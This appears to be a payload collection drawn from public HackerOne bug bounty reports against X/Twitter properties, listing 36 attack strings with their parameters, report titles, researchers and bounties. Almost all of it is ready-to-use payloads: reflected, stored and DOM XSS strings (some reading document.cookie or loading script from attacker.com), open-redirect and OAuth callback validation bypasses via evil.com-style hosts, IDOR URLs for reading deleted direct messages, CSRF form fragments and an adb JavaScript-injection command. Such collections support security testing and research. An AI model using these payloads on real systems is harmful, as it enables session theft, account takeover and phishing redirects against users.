# X / xAI

36 payloads.

### `0b5e7c3a`

```
https://target.com/intent/favorite/complete?tweet_id=572435913768366080&already_favorited=false&original_referer=javascript:alert%281%29;
```

**Parameter:** `original_referer`
— [XSS in original referrer after follow](https://hackerone.com/reports/50134) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)

### `acce0791`

```
https://target.com/1.1/direct_messages/show.json?id={DM-id}
```

**Parameter:** `id`
— [Insecure direct object reference - have access to deleted DM's](https://hackerone.com/reports/52646) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)

### `e6be060f`

```
https://target.com/1.1/direct_messages/show.json?id=[noted-dm-id
```

**Parameter:** `id`
— [Insecure direct object reference - have access to deleted DM's](https://hackerone.com/reports/52646) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)

### `de3791a7`

```
https://target.com/1.1/direct_messages/show.json?id=578631102144741376
```

**Parameter:** `id`
— [Insecure direct object reference - have access to deleted DM's](https://hackerone.com/reports/52646) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)

### `f817c619`

```
javascript%3A%2F%2F"><script>alert(document.domain)</script>
```

**Parameter:** `oauth_callback`
— [XSS on OAuth authorize/authenticate endpoint](https://hackerone.com/reports/87040) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `57b03a43`

```
javascript:
```

**Parameter:** `player_url`
— [Multiple DOMXSS on Amplify Web Player](https://hackerone.com/reports/88719) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `7728e469`

```
<form method="POST" action="                                         ">
```

— [URGENT : target.com Account Take Over Vulnerability](https://hackerone.com/reports/100849) · X / xAI · [hussein98d](https://hackerone.com/hussein98d) · $560.0

### `c2b24082`

```
<input type="hidden" name="authenticity_token" value=""/>
```

— [URGENT : target.com Account Take Over Vulnerability](https://hackerone.com/reports/100849) · X / xAI · [hussein98d](https://hackerone.com/hussein98d) · $560.0

### `8bee0f7b`

```
https://whatever@www.target.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `6c0a8863`

```
https://whatever\@www.target.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `3fae1ab4`

```
https://attacker.com%ff@www.target.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `cad89fd3`

```
https://attacker.com?@www.target.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `24e22f72`

```
https://target.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fevil3.com&callback_url=https://evil.com%FF@www.evil3.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `87f32fc9`

```
<script>alert(1);//
```

**Parameter:** `group_name`
— [Tweet Deck XSS- Persistent- Group DM name](https://hackerone.com/reports/119022) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)

### `9214d45d`

```
<svg onload=alert(document.domain)>
```

**Parameter:** `app_name`
— [DOMXSS in Tweetdeck](https://hackerone.com/reports/119471) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `7cfb3863`

```
https://target.com/en/jobs-search.html?location=1%22%3E%3Cscript%20src=//evil.com/tpm?tpm_cb=alert%28document.domain%29%3E//
```

**Parameter:** `location`
— [csp bypass + xss](https://hackerone.com/reports/153666) · X / xAI · [b6117130df17feef13481e3](https://hackerone.com/b6117130df17feef13481e3)

### `07dcbe11`

```
https://target.com//x:1/:///%01javascript:alert(document.cookie)/
```

— [\[target.com\] XSS and Open Redirect](https://hackerone.com/reports/260744) · X / xAI · [bobrov](https://hackerone.com/bobrov) · $1,120.0

### `41f35d5d`

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: target.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: target.com
```

**Parameter:** `User-Agent`
— [Blind XSS in Mobpub Marketplace Admin Production | Sentry via target.com (User-Agent)](https://hackerone.com/reports/275518) · X / xAI · [harisec](https://hackerone.com/harisec)

### `e29139a1`

```
https://target.com/teams/authorize?target_screen_name=&authorize_callback=//evil.com
```

**Parameter:** `authorize_callback`
— [Open Redirect Protection Bypass](https://hackerone.com/reports/283460) · X / xAI · [avinash_](https://hackerone.com/avinash_) · $280.0

### `fe246a0d`

```
target.com                         //target.com
```

— [Open Redirect Protection Bypass](https://hackerone.com/reports/283460) · X / xAI · [avinash_](https://hackerone.com/avinash_) · $280.0

### `9225c2fa`

```
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;https://target.com/oauth/authenticate?oauth_token=████████"></head></html>
```

— [Account Takeover in Periscope TV](https://hackerone.com/reports/317476) · X / xAI · [ngalog](https://hackerone.com/ngalog)

### `6c627186`

```
https://target.com/web/sign-inhttps://target.com/javascript:alert(1
```

— [\[target.com\] XSS and Open Redirect Protection Bypass](https://hackerone.com/reports/330008) · X / xAI · [bywalks](https://hackerone.com/bywalks) · $1,120.0

### `28ef61e1`

```
3. On the name, enter payload: **"><img src=x onerror=alert(document.domain)>**
```

**Parameter:** `name`
— [Stored XSS on reports.](https://hackerone.com/reports/485748) · X / xAI · [giddsec](https://hackerone.com/giddsec) · $700.0

### `bf4bdd70`

```
3. To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"
```

— [Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect ](https://hackerone.com/reports/499348) · X / xAI · [rahulkankrale](https://hackerone.com/rahulkankrale)

### `3fa05ed6`

```
https://target.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2F%E2%80%AEevil2.com
```

**Parameter:** `unsafe_link`
— [Wrong Interpretation of URL encoded characters, showing different punny code leads to redirection on different domain](https://hackerone.com/reports/635597) · X / xAI · [mr_edwards](https://hackerone.com/mr_edwards) · $560.0

### `d67b0c62`

```
https://target.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2F%E2%80%AEmoc.rettiwt
```

**Parameter:** `unsafe_link`
— [Wrong Interpretation of URL encoded characters, showing different punny code leads to redirection on different domain](https://hackerone.com/reports/635597) · X / xAI · [mr_edwards](https://hackerone.com/mr_edwards) · $560.0

### `0422387e`

```
https://target.com/login?next=https://evil.com.
```

**Parameter:** `next`
— [XSS and Open Redirect on MoPub Login](https://hackerone.com/reports/683298) · X / xAI · [jackb898](https://hackerone.com/jackb898) · $1,540.0

### `801a80dd`

```
https://target.com/login?next=https://evil.com
```

**Parameter:** `next`
— [XSS and Open Redirect on MoPub Login](https://hackerone.com/reports/683298) · X / xAI · [jackb898](https://hackerone.com/jackb898) · $1,540.0

### `0effde15`

```
https://target.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E
```

**Parameter:** `error_description`
— [Reflected XSS in target.com](https://hackerone.com/reports/770349) · X / xAI · [jubabaghdad](https://hackerone.com/jubabaghdad)

### `a6336579`

```
https://target.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E
```

**Parameter:** `error_description`
— [Reflected XSS in target.com](https://hackerone.com/reports/770349) · X / xAI · [jubabaghdad](https://hackerone.com/jubabaghdad)

### `9503a2cf`

```
https://target.com/student/award/███?referer=javascript:alert(document.domain)
```

**Parameter:** `referer`
— [XSS via referrer parameter](https://hackerone.com/reports/867616) · X / xAI · [keer0k](https://hackerone.com/keer0k)

### `c141e203`

```
https://target.com/student/award/████████?referer=javascript:alert(document.domain)
```

**Parameter:** `referer`
— [XSS via referrer parameter](https://hackerone.com/reports/867616) · X / xAI · [keer0k](https://hackerone.com/keer0k)

### `94aea291`

```
https%3A%2F%2Fddosecrets%25E3%2580%2582com
```

**Parameter:** `rd`
— [Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links](https://hackerone.com/reports/1032610) · X / xAI · [jub0bs](https://hackerone.com/jub0bs) · $560.0

### `a958b1eb`

```
https://target.com/daa/0/daa_optout_actions?action_id=4&rd=https%3A%2F%2Fddosecrets%25E3%2580%2582com%3F
```

**Parameter:** `rd`
— [Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links](https://hackerone.com/reports/1032610) · X / xAI · [jub0bs](https://hackerone.com/jub0bs) · $560.0

### `e4a54514`

```
https%3A%2F%2Fevil.com%2Fdaa%2F0%2Fdaa_optout_actions%3Faction_id%3D4%26rd%3Dhttps%253A%252F%252Fddosecrets%2525E3%252580%252582com%253F
```

**Parameter:** `redirect_after_login`
— [Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links](https://hackerone.com/reports/1032610) · X / xAI · [jub0bs](https://hackerone.com/jub0bs) · $560.0

### `bce9b461`

```
https://target.com/login?redirect_after_login=https%3A%2F%2Fevil.com%2Fdaa%2F0%2Fdaa_optout_actions%3Faction_id%3D4%26rd%3Dhttps%253A%252F%252Fddosecrets%2525E3%252580%252582com%253F
```

**Parameter:** `redirect_after_login`
— [Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links](https://hackerone.com/reports/1032610) · X / xAI · [jub0bs](https://hackerone.com/jub0bs) · $560.0
